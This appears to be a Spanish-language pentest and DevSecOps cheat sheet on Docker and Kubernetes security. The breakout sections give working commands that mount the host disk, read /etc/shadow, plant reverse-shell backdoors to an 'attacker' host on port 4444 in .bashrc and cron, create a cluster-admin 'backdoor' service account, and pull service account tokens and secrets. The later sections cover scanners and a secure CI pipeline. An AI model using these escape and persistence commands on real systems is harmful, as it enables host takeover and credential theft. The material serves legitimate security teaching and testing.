# Container Security

## Docker Security

### **Docker Architecture:**

```
COMPONENTES:
• Docker Engine (daemon)
• Docker CLI (client)
• Docker Images (plantillas)
• Docker Containers (instancias)
• Docker Registry (repositorio)

RIESGOS:
• Privileged containers
• Exposed Docker socket
• Vulnerable images
• Secrets in images
• Host breakout
```

---

## Docker Enumeration

### **Información Básica:**

```bash
# Versión
docker version

# Información del sistema
docker info

# Listar containers
docker ps -a

# Listar imágenes
docker images

# Inspeccionar container
docker inspect [container-id]

# Ver logs
docker logs [container-id]

# Ver procesos
docker top [container-id]
```

---

### **Buscar Secrets en Images:**

```bash
# Descargar imagen
docker pull company/app:latest

# Inspeccionar history
docker history company/app:latest

# Buscar secrets en layers
docker save company/app:latest -o app.tar
tar -xf app.tar
grep -r "password\|secret\|key" .

# Dive (analizar layers)
docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock wagoodman/dive:latest company/app:latest
```

---

## Docker Breakout

### **Privileged Container Escape:**

```bash
# Si container es privileged (-privileged flag)
# Tenemos acceso al host

# Verificar si es privileged
cat /proc/self/status | grep CapEff

# Montar disco del host
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Acceso completo al filesystem del host
ls /mnt/host
cat /mnt/host/etc/shadow

# Backdoor en host
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' > /mnt/host/root/.bashrc

# O crear cron job en host
echo '* * * * * root bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"' > /mnt/host/etc/cron.d/backdoor
```

---

### **Docker Socket Exposed:**

```bash
# Si /var/run/docker.sock está montado en container

# Crear container privileged desde dentro
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash

# Ahora estás en el host con root
```

---

## Docker Security Scanning

### **Trivy (Vulnerability Scanner):**

```bash
# Instalar
wget https://github.com/aquasecurity/trivy/releases/download/v0.48.0/trivy_0.48.0_Linux-64bit.deb
sudo dpkg -i trivy_0.48.0_Linux-64bit.deb

# Escanear imagen
trivy image nginx:latest

# Escanear filesystem
trivy fs /path/to/project

# Severidades: CRITICAL, HIGH, MEDIUM, LOW

# Reporte JSON
trivy image -f json -o report.json nginx:latest
```

---

### **Grype (Anchore):**

```bash
# Instalar
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh

# Escanear
grype nginx:latest

# Solo critical y high
grype nginx:latest --fail-on high
```

---

### **Clair (CoreOS):**

```bash
# Correr con Docker
docker run -d -p 6060:6060 quay.io/coreos/clair:latest

# Analizar imagen
clairctl analyze nginx:latest
clairctl report nginx:latest
```

---

## Kubernetes Security

### **K8s Architecture:**

```
CONTROL PLANE:
• API Server (entrada)
• etcd (database)
• Scheduler
• Controller Manager

WORKER NODES:
• kubelet (agent)
• kube-proxy (networking)
• Container runtime (Docker, containerd)

RECURSOS:
• Pods (grupo de containers)
• Services (networking)
• Deployments
• ConfigMaps, Secrets
```

---

## Kubernetes Enumeration

### **kubectl Básico:**

```bash
# Configurar kubeconfig
export KUBECONFIG=/path/to/kubeconfig

# Verificar acceso
kubectl auth can-i --list

# Listar namespaces
kubectl get namespaces

# Listar pods
kubectl get pods --all-namespaces

# Listar services
kubectl get svc -A

# Listar secrets
kubectl get secrets -A

# Describir pod
kubectl describe pod [pod-name] -n [namespace]

# Ver logs
kubectl logs [pod-name] -n [namespace]

# Ejecutar comando en pod
kubectl exec -it [pod-name] -n [namespace] -- /bin/bash
```

---

## Kubernetes Attack Techniques

### **1. Exposed Dashboard:**

```bash
# Buscar dashboard expuesto
# Default: http://[cluster-ip]:30000 o 8001

# Si no requiere auth → acceso completo

# Crear service account con permisos admin
kubectl create serviceaccount backdoor
kubectl create clusterrolebinding backdoor-admin --clusterrole=cluster-admin --serviceaccount=default:backdoor

# Obtener token
kubectl get secret $(kubectl get sa backdoor -o jsonpath='{.secrets[0].name}') -o jsonpath='{.data.token}' | base64 -d
```

---

### **2. Escape de Pod:**

```bash
# Si pod tiene privileged: true o hostPath mount

# Ver capabilities
capsh --print

# Si tiene CAP_SYS_ADMIN → puede montar host

# Montar host
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Crear backdoor en host
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' > /mnt/host/root/.bashrc
```

---

### **3. Secrets Extraction:**

```bash
# Leer secrets del pod actual
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Usar token para acceder a API server
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/secrets

# Extraer todos los secrets
kubectl get secrets --all-namespaces -o json
```

---

## Kubernetes Security Tools

### **kube-bench (CIS Benchmark):**

```bash
# Ejecutar en cluster
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml

# Ver resultados
kubectl logs [kube-bench-pod]

# Checks:
• API server configuration
• etcd security
• Controller Manager
• Scheduler
• Kubelet
```

---

### **kubeaudit:**

```bash
# Instalar
go get -u github.com/Shopify/kubeaudit

# Auditar cluster
kubeaudit all

# Checks específicos
kubeaudit privileged
kubeaudit capabilities
kubeaudit hostns
```

---

### **kube-hunter:**

```bash
# Ejecutar como pod
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-hunter/main/job.yaml

# Ver resultados
kubectl logs [kube-hunter-pod]

# Identifica:
• Exposed services
• Misconfigurations
• Known vulnerabilities
• Privilege escalation paths
```

---

# DevSecOps

## CI/CD Security

### **Pipeline Vulnerabilities:**

```
COMMON ISSUES:
• Secrets in code
• Insecure dependencies
• No SAST/DAST
• Privileged CI runners
• Supply chain attacks
• Artifact tampering

STAGES:
1. Source Code Management (SCM)
2. Build
3. Test
4. Security Scan
5. Deploy
```

---

## Secrets Management

### **GitLeaks (Buscar secrets en repos):**

```bash
# Instalar
brew install gitleaks
# O
docker pull zricethezav/gitleaks:latest

# Escanear repositorio
gitleaks detect -v

# Escanear durante commit
gitleaks protect -v

# Escanear repo remoto
gitleaks detect --source=https://github.com/company/repo

# Encuentra:
• API keys
• Passwords
• AWS keys
• Private keys
• Tokens
```

---

### **TruffleHog:**

```bash
# Instalar
pip3 install truffleHog

# Escanear repo
trufflehog git https://github.com/company/repo --json

# Escanear filesystem
trufflehog filesystem /path/to/code

# Entropy-based detection
# Encuentra secrets por patrones
```

---

### **git-secrets (AWS):**

```bash
# Instalar
git clone https://github.com/awslabs/git-secrets
cd git-secrets
make install

# Setup en repo
cd /path/to/repo
git secrets --install
git secrets --register-aws

# Escanear commits
git secrets --scan-history
```

---

## SAST (Static Application Security Testing)

### **SonarQube:**

```bash
# Correr con Docker
docker run -d -p 9000:9000 sonarqube:latest

# Acceder: http://localhost:9000
# Default: admin/admin

# Escanear proyecto (Java example)
mvn sonar:sonar -Dsonar.host.url=http://localhost:9000 -Dsonar.login=token

# Detecta:
• Code smells
• Bugs
• Security vulnerabilities
• Code coverage
```

---

### **Semgrep:**

```bash
# Instalar
pip3 install semgrep

# Escanear con reglas default
semgrep --config=auto .

# Reglas específicas (OWASP Top 10)
semgrep --config=p/owasp-top-ten .

# Python security
semgrep --config=p/python .

# Custom rule
semgrep --config=my-rule.yaml .

# Muy rápido, menos false positives que otros
```

---

### **Bandit (Python):**

```bash
# Instalar
pip3 install bandit

# Escanear proyecto
bandit -r /path/to/project

# Severidad alta/media
bandit -r -ll /path/to/project

# JSON output
bandit -r -f json -o report.json /path/to/project

# Detecta:
• SQL injection
• Hardcoded passwords
• Insecure crypto
• Command injection
```

---

## DAST (Dynamic Application Security Testing)

### **OWASP ZAP (Automatizado):**

```bash
# Docker
docker pull owasp/zap2docker-stable

# Baseline scan (pasivo)
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://example.com

# Full scan (activo)
docker run -t owasp/zap2docker-stable zap-full-scan.py -t https://example.com

# API scan
docker run -t owasp/zap2docker-stable zap-api-scan.py -t https://example.com/openapi.json

# Integrar en CI/CD
```

---

## Dependency Scanning

### **OWASP Dependency-Check:**

```bash
# Descargar
wget https://github.com/jeremylong/DependencyCheck/releases/download/v8.4.0/dependency-check-8.4.0-release.zip
unzip dependency-check-8.4.0-release.zip

# Escanear proyecto
./dependency-check/bin/dependency-check.sh --project "MyApp" --scan /path/to/project

# Genera reporte HTML
# Identifica CVEs en dependencias
```

---

### **Snyk:**

```bash
# Instalar
npm install -g snyk

# Autenticar
snyk auth

# Escanear proyecto
snyk test

# Escanear container
snyk container test nginx:latest

# Fix automático (intenta)
snyk wizard

# Integración con GitHub, GitLab, etc.
```

---

## Infrastructure as Code (IaC) Security

### **Checkov (Terraform, Kubernetes, Docker):**

```bash
# Instalar
pip3 install checkov

# Escanear Terraform
checkov -d /path/to/terraform

# Escanear Kubernetes manifests
checkov -d /path/to/k8s

# Dockerfile
checkov -f Dockerfile

# JSON output
checkov -d . -o json

# Detecta:
• Misconfigurations
• Secrets hardcoded
• Insecure defaults
• Compliance violations
```

---

### **tfsec (Terraform):**

```bash
# Instalar
brew install tfsec
# O
curl -s https://raw.githubusercontent.com/aquasecurity/tfsec/master/scripts/install_linux.sh | bash

# Escanear
tfsec .

# Severidades específicas
tfsec --minimum-severity HIGH .

# Muy rápido, específico para Terraform
```

---

## CI/CD Pipeline Ejemplo Seguro

### **GitLab CI (.gitlab-ci.yml):**

```yaml
stages:
  - secrets-scan
  - sast
  - dependency-check
  - build
  - container-scan
  - dast
  - deploy

gitleaks:
  stage: secrets-scan
  image: zricethezav/gitleaks:latest
  script:
    - gitleaks detect -v
  allow_failure: false

semgrep:
  stage: sast
  image: returntocorp/semgrep:latest
  script:
    - semgrep --config=auto . --json -o semgrep-report.json
  artifacts:
    reports:
      sast: semgrep-report.json

dependency-check:
  stage: dependency-check
  script:
    - dependency-check --project MyApp --scan . --format JSON
  artifacts:
    reports:
      dependency_scanning: dependency-check-report.json

build:
  stage: build
  script:
    - docker build -t myapp:$CI_COMMIT_SHA .

trivy:
  stage: container-scan
  script:
    - trivy image myapp:$CI_COMMIT_SHA
  allow_failure: false

zap-scan:
  stage: dast
  script:
    - docker run -t owasp/zap2docker-stable zap-baseline.py -t https://staging.example.com

deploy:
  stage: deploy
  script:
    - kubectl apply -f k8s/
  only:
    - main
```